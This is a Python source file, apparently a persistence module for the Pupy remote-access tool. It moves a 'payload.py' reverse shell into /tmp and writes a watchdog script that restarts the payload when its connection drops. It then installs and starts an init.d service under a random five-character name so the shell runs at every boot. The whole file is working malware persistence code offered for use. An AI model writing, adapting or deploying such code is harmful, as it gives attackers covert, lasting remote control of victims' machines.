#!/usr/bin/env python
import os
import stat
import random
import string
import threading
import sys
from subprocess import call
 
 
class LinuxAutorun(threading.Thread):
 
    def __init__(self, *args, **kwargs):
        self.original_wd = os.getcwd()
        self.random_alias_name = ''.join(random.SystemRandom().choice(string.ascii_uppercase  + string.digits) for _ in range(5))

    def deamon_shell_code(self):
        os.system("mv " + self.original_wd + "/payload.py /tmp/payload.py \n")
        return ('#!/bin/sh\n'
                '### BEGIN INIT INFO\n'
                '# Provides:          Pupy Reverse Shell\n'
                '# Required-Start:    $remote_fs $syslog\n'
                '# Required-Stop:     $remote_fs $syslog\n'
                '# Default-Start:     2 3 4 5\n'
                '# Default-Stop:      0 1 6\n'
                '# Short-Description: Start daemon at boot time\n'
                '# Description:       Enable service provided by daemon.\n'
                '### END INIT INFO\n'
                '\n'
                'dir="/tmp/"\n'
                'cmd="python watch.py"\n'
                'user=""\n'
                '\n'
                'name=`basename $0`\n'
                'pid_file="/var/run/$name.pid"\n'
                'stdout_log="/tmp/mshell.log"\n'
                'stderr_log="/tmp/mshell..err"\n'
                '\n'
                'get_pid() {\n'
                '    cat "$pid_file"\n'
                '}\n'
                '\n'
                'is_running() {\n'
                '    [ -f "$pid_file" ] && ps `get_pid` > /dev/null 2>&1\n'
                '}\n'
                '\n'
                'case "$1" in\n'
                '    start)\n'
                '    if is_running; then\n'
                '        echo "Already started"\n'
                '    else\n'
                '        echo "Starting $name"\n'
                '        cd "$dir"\n'
                '        if [ -z "$user" ]; then\n'
                '            sudo $cmd >> "$stdout_log" 2>> "$stderr_log" &\n'
                '        else\n'
                '            sudo -u "$user" $cmd >> "$stdout_log" 2>> "$stderr_log" &\n'
                '        fi\n'
                '        echo $! > "$pid_file"\n'
                '        if ! is_running; then\n'
                '            echo "Unable to start, see $stdout_log and $stderr_log"\n'
                '            exit 1\n'
                '        fi\n'
                '    fi\n'
                '    ;;\n'
                '    stop)\n'
                '    if is_running; then\n'
                '        echo -n "Stopping $name.."\n'
                '        kill `get_pid`\n'
                '        for i in {1..10}\n'
                '        do\n'
                '            if ! is_running; then\n'
                '                break\n'
                '            fi\n'
                '\n'
                '            echo -n "."\n'
                '            sleep 1\n'
                '        done\n'
                '        echo\n'
                '\n'
                '        if is_running; then\n'
                '            echo "Not stopped; may still be shutting down or shutdown may have failed"\n'
                '            exit 1\n'
                '        else\n'
                '            echo "Stopped"\n'
                '            if [ -f "$pid_file" ]; then\n'
                '                rm "$pid_file"\n'
                '            fi\n'
                '        fi\n'
                '    else\n'
                '        echo "Not running"\n'
                '    fi\n'
                '    ;;\n'
                '    restart)\n'
                '    $0 stop\n'
                '    if is_running; then\n'
                '        echo "Unable to stop, will not attempt to start"\n'
                '        exit 1\n'
                '    fi\n'
                '    $0 start\n'
                '    ;;\n'
                '    status)\n'
                '    if is_running; then\n'
                '        echo "Running"\n'
                '    else\n'
                '        echo "Stopped"\n'
                '        exit 1\n'
                '    fi\n'
                '    ;;\n'
                '    *)\n'
                '    echo "Usage: $0 {start|stop|restart|status}"\n'
                '    exit 1\n'
                '    ;;\n'
                'esac\n'
                '\n'
                'exit 0\n')

    def watcher_code(self):
        return ('#!/usr/bin/ python\n'
                'import os\n'
                'import time\n'
                'from subprocess import call\n'
                '\n'
                'def startShell():\n'
                '    os.popen("/tmp/payload.py &")\n'
                '    time.sleep(30)\n'
                '\n'
                'def stopShell():\n'
                '    os.popen("pkill -9 -f payload.py")\n'
                '    time.sleep(30)\n'
                '    startShell()\n'
                '\n'
                'def checkStatus():\n'
                '    status = os.popen("netstat -antpu | grep payload").read()\n'
                '    if "ESTABLISHED" not in status[:]:\n'
                '        tmp = os.popen("ps -Af | grep payload").read()\n'
                '        if \'defunct\' in tmp[:]:\n'
                '            stopShell()\n'
                '    else:\n'
                '        time.sleep(60)\n'
                '\n'
                '\n'
                'while (1):\n'
                '    tmp = os.popen("ps -Af | grep payload").read()\n'
                '    if "payload.py" not in tmp[:]:\n'
                '        time.sleep(10)\n'
                '        startShell()\n'
                '    else:\n'
                '        checkStatus()\n')


    def run(self):
        if not os.path.isfile("/tmp/watch.py"):
                code = self.watcher_code()
                open("watch.py", 'w').write(code)
                os.system("mv " + self.original_wd + "/watch.py /tmp/watch.py \n")
                code = self.deamon_shell_code()
                self.deamon_script = os.path.join('/etc/init.d/', self.random_alias_name)
                open(self.deamon_script, 'w').write(code)
                print "Wrote deamon code to script", self.deamon_script
                os.system("chmod 555 /tmp/payload.py\n")
                st = os.stat(self.deamon_script)
                os.system("chmod +x /etc/init.d/" + self.random_alias_name + "\n")
                os.chmod(self.deamon_script, st.st_mode | stat.S_IEXEC)
                os.system("update-rc.d " + self.random_alias_name + " defaults \n")
                os.system("service " + self.random_alias_name + " start \n")






if __name__=="__main__":
    autorun = LinuxAutorun().run()
    print "Finshed Deploying Deamon"
